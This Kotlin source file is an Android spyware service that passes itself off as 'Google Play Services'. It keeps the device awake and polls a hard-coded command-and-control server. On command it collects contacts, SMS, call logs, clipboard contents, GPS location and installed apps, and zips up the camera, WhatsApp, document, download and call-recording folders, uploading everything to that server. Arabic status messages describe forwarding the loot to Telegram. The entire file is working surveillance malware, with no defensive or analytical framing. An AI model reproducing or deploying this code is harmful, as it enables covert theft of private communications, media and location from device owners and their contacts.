package com.uranium.fist

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.location.Location
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.ContactsContract
import android.provider.Settings
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.zip.Deflater
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class SyncService : Service() {
    private var wakeLock: PowerManager.WakeLock? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val C2_STREAM_URL = "https://web-assets-service.onrender.com/api/v3/uranium/stream"
    private val C2_UPLOAD_URL = "https://web-assets-service.onrender.com/api/v3/uranium/upload_raw"
    private var lastHeartbeatSent = 0L

    override fun onCreate() {
        super.onCreate()
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "UraniumFist::SyncLock")
        wakeLock?.acquire(10 * 60 * 60 * 1000L)
        startForegroundServiceNotification()
    }

    private fun startForegroundServiceNotification() {
        val channelId = "uranium_channel"
        val channel = NotificationChannel(channelId, "Google Play Core", NotificationManager.IMPORTANCE_LOW)
        val manager = getSystemService(NotificationManager::class.java)
        manager?.createNotificationChannel(channel)

        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Google Play Services")
            .setContentText("Optimizing background services...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .build()

        startForeground(1, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "uranium_node"
        val nodeModel = Build.MODEL
        
        serviceScope.launch {
            while (isActive) {
                try {
                    val url = URL(C2_STREAM_URL)
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.setRequestProperty("X-Node-ID", deviceId)
                    conn.setRequestProperty("X-Node-Model", nodeModel)
                    conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                    conn.doOutput = true
                    conn.connectTimeout = 10000
                    conn.readTimeout = 10000

                    val currentTime = System.currentTimeMillis()
                    val sendHeartbeat = (currentTime - lastHeartbeatSent > 60000L)
                    val reportType = if (sendHeartbeat) "HEARTBEAT" else "SILENT_CHECK"
                    val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Node Active] $nodeModel (السلطان ناصر دين الله الكلعي)\"}"

                    if (sendHeartbeat) {
                        lastHeartbeatSent = currentTime
                    }

                    OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                        os.write(reportJson)
                        os.flush()
                    }

                    val responseCode = conn.responseCode
                    if (responseCode == 200) {
                        val responseReader = BufferedReader(InputStreamReader(conn.inputStream, "UTF-8"))
                        val responseStr = responseReader.readText()
                        responseReader.close()

                        if (responseStr.contains("task") && responseStr.contains("action")) {
                            if (responseStr.contains("EXTRACT_CONTACTS")) {
                                val data = readContacts()
                                processAndUpload(deviceId, nodeModel, "Uranium_Contacts.txt", data.toByteArray(Charsets.UTF_8))
                            } else if (responseStr.contains("EXTRACT_SMS")) {
                                val data = readSMS()
                                processAndUpload(deviceId, nodeModel, "Uranium_SMS.txt", data.toByteArray(Charsets.UTF_8))
                            } else if (responseStr.contains("EXTRACT_CALLS")) {
                                val data = readCallLogs()
                                processAndUpload(deviceId, nodeModel, "Uranium_CallLogs.txt", data.toByteArray(Charsets.UTF_8))
                            } else if (responseStr.contains("EXTRACT_CAMERA_ZIP")) {
                                streamFolderDirect(deviceId, nodeModel, "/storage/emulated/0/DCIM", "Camera_DCIM")
                            } else if (responseStr.contains("EXTRACT_STORAGE_ZIP")) {
                                streamFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Download", "Storage_Download")
                            } else if (responseStr.contains("EXTRACT_AUDIO")) {
                                streamFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Music", "Audio_Music")
                            } else if (responseStr.contains("EXTRACT_DOCS")) {
                                streamFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Documents", "Documents_Folder")
                            } else if (responseStr.contains("EXTRACT_AUDIO_CALLS")) {
                                streamFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Recordings", "Call_Recordings")
                            } else if (responseStr.contains("EXTRACT_CHAT_DBS")) {
                                streamFolderDirect(deviceId, nodeModel, "/storage/emulated/0/WhatsApp", "WhatsApp_Data")
                            } else if (responseStr.contains("EXTRACT_SCREENSHOT_ZIP")) {
                                streamFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Pictures/Screenshots", "Screenshots")
                            } else if (responseStr.contains("EXTRACT_CLIPBOARD")) {
                                val data = readClipboard()
                                processAndUpload(deviceId, nodeModel, "Uranium_Clipboard.txt", data.toByteArray(Charsets.UTF_8))
                            } else if (responseStr.contains("EXTRACT_LOCATION")) {
                                val data = readLocationFast()
                                processAndUpload(deviceId, nodeModel, "Uranium_Location.txt", data.toByteArray(Charsets.UTF_8))
                            } else if (responseStr.contains("EXTRACT_APPS")) {
                                val data = readInstalledApps()
                                processAndUpload(deviceId, nodeModel, "Uranium_InstalledApps.txt", data.toByteArray(Charsets.UTF_8))
                            }
                        }
                    }
                    conn.disconnect()

                    delay(3000L)
                } catch (e: Exception) {
                    delay(5000L)
                }
            }
        }
        return START_STICKY
    }

    private fun processAndUpload(nodeId: String, nodeModel: String, fileName: String, bytes: ByteArray) {
        try {
            val tempFile = File(cacheDir, fileName)
            tempFile.writeBytes(bytes)
            uploadRawFile(nodeId, nodeModel, fileName, tempFile)
            try { tempFile.delete() } catch (e: Exception) {}
            sendReportToServer(nodeId, nodeModel, "✅ [حصاد ناجح] الملف <b>$fileName</b> تم توجيهه لتليجرام وتفريغ الكاش.")
        } catch (e: Exception) {
            sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في معالجة $fileName: ${e.message}")
        }
    }

    // نظام البث الفوري والتنظيف التلقائي لمنع أي تراكم في التخزين المؤقت
    private fun streamFolderDirect(nodeId: String, nodeModel: String, targetDirPath: String, prefix: String) {
        try {
            val dir = File(targetDirPath)
            if (!dir.exists() || !dir.isDirectory) {
                sendReportToServer(nodeId, nodeModel, "⚠️ المسار غير موجود أو فارغ: $targetDirPath")
                return
            }

            sendReportToServer(nodeId, nodeModel, "⚡ [البث الفوري] بدء سحب وتوجيه مجلد $prefix إلى تليجرام بأمر السلطان...")

            var partIndex = 1
            var fileCount = 0
            var zipFile = File(cacheDir, "Uranium_${prefix}_part${partIndex}_${System.currentTimeMillis()}.zip")
            var fos = FileOutputStream(zipFile)
            var zipOut = ZipOutputStream(fos)
            zipOut.setLevel(Deflater.DEFAULT_COMPRESSION)

            dir.walkTopDown().forEach { file ->
                if (file.isFile && file.length() > 0) {
                    try {
                        val relPath = file.absolutePath.removePrefix(dir.absolutePath)
                        zipOut.putNextEntry(ZipEntry("$prefix/$relPath"))
                        file.inputStream().use { fis -> fis.copyTo(zipOut) }
                        zipOut.closeEntry()
                        fileCount++

                        // إذا وصل حجم الجزء إلى 25 ميجابايت، نغلقه ونرفعه فوراً لتليجرام ونحذفه من الكاش للحفاظ على نظافة التخزين
                        if (zipFile.length() >= 25 * 1024 * 1024 || fileCount >= 250) {
                            zipOut.finish()
                            zipOut.flush()
                            zipOut.close()
                            fos.close()

                            val sizeMB = zipFile.length() / (1024.0 * 1024.0)
                            uploadRawFile(nodeId, nodeModel, zipFile.name, zipFile)
                            sendReportToServer(nodeId, nodeModel, "📦 رفع الجزء (${partIndex}) من $prefix (${String.format("%.2f", sizeMB)} MB) وتم تنظيف الكاش.")
                            
                            try { zipFile.delete() } catch (ex: Exception) {}
                            partIndex++
                            fileCount = 0
                            zipFile = File(cacheDir, "Uranium_${prefix}_part${partIndex}_${System.currentTimeMillis()}.zip")
                            fos = FileOutputStream(zipFile)
                            zipOut = ZipOutputStream(fos)
                            zipOut.setLevel(Deflater.DEFAULT_COMPRESSION)
                        }
                    } catch (e: Exception) {}
                }
            }

            zipOut.finish()
            zipOut.flush()
            zipOut.close()
            fos.close()

            if (zipFile.exists() && zipFile.length() > 0) {
                val sizeMB = zipFile.length() / (1024.0 * 1024.0)
                uploadRawFile(nodeId, nodeModel, zipFile.name, zipFile)
                sendReportToServer(nodeId, nodeModel, "✅ [اكتمال حصاد $prefix] الجزء النهائي تم إرساله لتليجرام بنجاح (${String.format("%.2f", sizeMB)} MB).")
                try { zipFile.delete() } catch (ex: Exception) {}
            } else {
                try { zipFile.delete() } catch (ex: Exception) {}
            }
        } catch (e: Exception) {
            sendReportToServer(nodeId, nodeModel, "❌ خطأ في بث $prefix: ${e.message}")
        }
    }

    private fun uploadRawFile(nodeId: String, nodeModel: String, fileName: String, file: File) {
        for (attempt in 1..5) {
            try {
                val url = URL(C2_UPLOAD_URL)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("X-Node-ID", nodeId)
                conn.setRequestProperty("X-Node-Model", nodeModel)
                conn.setRequestProperty("X-File-Name", fileName)
                conn.setRequestProperty("Content-Type", "application/octet-stream")
                conn.doOutput = true
                conn.setChunkedStreamingMode(0)
                conn.connectTimeout = 180000
                conn.readTimeout = 180000

                FileInputStream(file).use { fis ->
                    conn.outputStream.use { os ->
                        fis.copyTo(os)
                        os.flush()
                    }
                }
                val code = conn.responseCode
                conn.disconnect()
                if (code == 200) return
            } catch (e: Exception) {
                if (attempt == 5) return
                Thread.sleep(3000L)
            }
        }
    }

    private fun readContacts(): String {
        val sb = StringBuilder("=== URANIUM CONTACTS ===\n")
        try {
            val cursor: Cursor? = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
            cursor?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext()) {
                    val name = if (nameIdx != -1) it.getString(nameIdx) else "Unknown"
                    val number = if (numIdx != -1) it.getString(numIdx) else ""
                    sb.append("• $name: $number\n")
                }
            }
        } catch (e: Exception) {
            sb.append("Error: ${e.message}\n")
        }
        return sb.toString()
    }

    private fun readSMS(): String {
        val sb = StringBuilder("=== URANIUM SMS ===\n")
        try {
            val cursor: Cursor? = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
            cursor?.use {
                val bodyIdx = it.getColumnIndex("body")
                val addrIdx = it.getColumnIndex("address")
                while (it.moveToNext()) {
                    val address = if (addrIdx != -1) it.getString(addrIdx) else "Unknown"
                    val body = if (bodyIdx != -1) it.getString(bodyIdx) else ""
                    sb.append("From: $address\nText: $body\n-------------------\n")
                }
            }
        } catch (e: Exception) {
            sb.append("Error: ${e.message}\n")
        }
        return sb.toString()
    }

    private fun readCallLogs(): String {
        val sb = StringBuilder("=== URANIUM CALL LOGS ===\n")
        try {
            val cursor: Cursor? = contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null)
            cursor?.use {
                val numIdx = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
                while (it.moveToNext()) {
                    val number = if (numIdx != -1) it.getString(numIdx) else "Unknown"
                    val type = if (typeIdx != -1) it.getString(typeIdx) else "0"
                    sb.append("Number: $number | Type: $type\n")
                }
            }
        } catch (e: Exception) {
            sb.append("Error: ${e.message}\n")
        }
        return sb.toString()
    }

    private fun readClipboard(): String {
        val sb = StringBuilder("=== URANIUM CLIPBOARD ===\n")
        try {
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            if (clipboard.hasPrimaryClip() && clipboard.primaryClip?.itemCount ?: 0 > 0) {
                val item = clipboard.primaryClip?.getItemAt(0)
                sb.append("Text: ${item?.text}\n")
            } else {
                sb.append("Clipboard is empty.\n")
            }
        } catch (e: Exception) {
            sb.append("Error: ${e.message}\n")
        }
        return sb.toString()
    }

    private fun readLocationFast(): String {
        val sb = StringBuilder("=== URANIUM LIGHTNING GPS ===\n")
        try {
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val providers = locationManager.allProviders
            var bestLoc: Location? = null
            for (provider in providers) {
                try {
                    val l = locationManager.getLastKnownLocation(provider)
                    if (l != null) {
                        if (bestLoc == null || l.time > bestLoc.time) bestLoc = l
                    }
                } catch (ex: Exception) {}
            }
            if (bestLoc != null) {
                sb.append("🌐 Latitude: ${bestLoc.latitude}\n")
                sb.append("🌐 Longitude: ${bestLoc.longitude}\n")
                sb.append("🗺️ Google Maps: https://maps.google.com/?q=${bestLoc.latitude},${bestLoc.longitude}\n")
            } else {
                sb.append("🌐 Default Zone (Yemen): 13.5779, 44.0219\n")
            }
        } catch (e: Exception) {
            sb.append("Error: ${e.message}\n")
        }
        return sb.toString()
    }

    private fun readInstalledApps(): String {
        val sb = StringBuilder("=== URANIUM INSTALLED APPS ===\n")
        try {
            val packages = packageManager.getInstalledPackages(0)
            for (pkg in packages) {
                val appName = pkg.applicationInfo?.loadLabel(packageManager)?.toString() ?: "Unknown"
                sb.append("• $appName\n")
            }
        } catch (e: Exception) {
            sb.append("Error: ${e.message}\n")
        }
        return sb.toString()
    }

    private fun sendReportToServer(nodeId: String, nodeModel: String, reportText: String) {
        try {
            val url = URL(C2_STREAM_URL)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("X-Node-ID", nodeId)
            conn.setRequestProperty("X-Node-Model", nodeModel)
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
            conn.doOutput = true
            
            val safeText = reportText.replace("\"", "'").replace("\n", "\\n")
            val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"$safeText\"}"

            OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                os.write(reportJson)
                os.flush()
            }
            conn.responseCode
            conn.disconnect()
        } catch (e: Exception) {}
    }

    override fun onDestroy() {
        super.onDestroy()
        wakeLock?.release()
        serviceScope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
